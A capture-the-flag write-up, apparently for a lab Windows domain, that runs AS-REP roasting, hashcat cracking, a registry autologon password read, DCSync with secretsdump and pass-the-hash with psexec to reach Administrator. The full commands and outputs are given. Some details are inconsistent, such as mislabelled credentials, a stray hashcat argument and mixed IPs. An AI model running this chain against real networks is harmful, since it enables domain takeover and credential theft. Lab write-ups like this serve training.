
When I visit the victim's ip via web browser, the `about.html` page has `team` portion that lists potential users of the web-app.

I add the users to `users.txt`

```
$ cat users.txt
fsmith
scoins
hbear
btaylor
skerb
sdriver
fergus.smith
hugo.bear
steven.kerb
shaun.coins
bowie.taylor
sophie.driver
svc_loanmgr
```

I then run `GetNPUsers.py` to get a hash for those users and I get the hash of `fsmith`.

```
for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip 10.129.80.69 htb/${user} | grep -v Impacket; done

...

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cbe728e716494a8948bb39d0d82551b3$cae3233457b9665106ae9c11ad3bf82faade3b78c64746f7af6f2e4eff278e9ac8b046973c0530b988fef6de3d3805700ff1333e792c37f16521b49d60fb39fa89aa379aba91e8c9a360706e0825bf6618e9816ecb745bdb848b383371572b9e8b4ad53528de548d7d10f0726191d3dba8d38a0d029711e0796109abe181bd7a3fcacc7a6a793050ac5b47615adc411d49a9936a72daed7bd15aa51954fa9967f9c622b3627e2037d090af6f467b1e80a635194bc780e31c5406f3bac42ede497bcae6a88b3ac97eef8347af9ac9d3fdc5823b1a31b430c53da4c440a2583cf2d903e11ff502cdb07ca13b7f2c0a45f8b5ec7dbf0912652eac232689c9117e2d
```

I echo the hash into a file and use `hashcat` to break the hash.

```
echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cbe728e716494a8948bb39d0d82551b3$cae3233457b9665106ae9c11ad3bf82faade3b78c64746f7af6f2e4eff278e9ac8b046973c0530b988fef6de3d3805700ff1333e792c37f16521b49d60fb39fa89aa379aba91e8c9a360706e0825bf6618e9816ecb745bdb848b383371572b9e8b4ad53528de548d7d10f0726191d3dba8d38a0d029711e0796109abe181bd7a3fcacc7a6a793050ac5b47615adc411d49a9936a72daed7bd15aa51954fa9967f9c622b3627e2037d090af6f467b1e80a635194bc780e31c5406f3bac42ede497bcae6a88b3ac97eef8347af9ac9d3fdc5823b1a31b430c53da4c440a2583cf2d903e11ff502cdb07ca13b7f2c0a45f8b5ec7dbf0912652eac232689c9117e2d' > hash.txt

$ hashcat -m 18200 svc-alfresco^Cerb /usr/share/wordlists/rockyou.txt

...

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:cbe728e716494a8948bb39d0d82551b3$cae3233457b9665106ae9c11ad3bf82faade3b78c64746f7af6f2e4eff278e9ac8b046973c0530b988fef6de3d3805700ff1333e792c37f16521b49d60fb39fa89aa379aba91e8c9a360706e0825bf6618e9816ecb745bdb848b383371572b9e8b4ad53528de548d7d10f0726191d3dba8d38a0d029711e0796109abe181bd7a3fcacc7a6a793050ac5b47615adc411d49a9936a72daed7bd15aa51954fa9967f9c622b3627e2037d090af6f467b1e80a635194bc780e31c5406f3bac42ede497bcae6a88b3ac97eef8347af9ac9d3fdc5823b1a31b430c53da4c440a2583cf2d903e11ff502cdb07ca13b7f2c0a45f8b5ec7dbf0912652eac232689c9117e2d:Thestrokes23
```

Above I got the credentials `svc-alfresco:Thestrokes23`, to login I use `evil-winrm`:

```
$ evil-winrm -i 10.129.80.69 -u fsmith -p Thestrokes23
```

From here I can cat the user flag:

```
C:\Users\FSmith\Desktop> cat user.txt
9448503be312b368c979a07686643305
```

It is time for privilege escalation, normally I would use WinPEAS.exe, but had issues with it.

I was able however, to run `reg.exe`, which interacts with Windows Registry Editor.

```
*Evil-WinRM* PS C:\Users\FSmith\Documents> reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
...

DefaultDomainName    REG_SZ    EGOTISTICALBANK
DefaultUserName    REG_SZ    EGOTISTICALBANK\svc_loanmanager
...
DefaultPassword    REG_SZ    Moneymakestheworldgoround!
```

I now have the credentials `svc_loanmanager:Moneymakestheworldgoround`

I can connect to this user using `evil-winrm`

```
$ evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

I can do a `secretsdump` to get the Administrator credentials, where I get the Admin's credentials.

```
$ secretsdump.py egotistical-bank/svc_loanmgr@10.129.80.69 -just-dc-user Administrator
...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
```

I use this hash to login as Administrator:

```
$ psexec.py egotistical-bank.local/administrator@10.129.80.69 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e

C:\Windows\system32> powershell

PS C:\Windows\system32> cd ..

PS C:\Windows> cd Administrator/Desktop

PS C:\Windows\Administrator\Desktop> cat root.txt
f3fde5394d127479b8d68650a94ce4e6
```

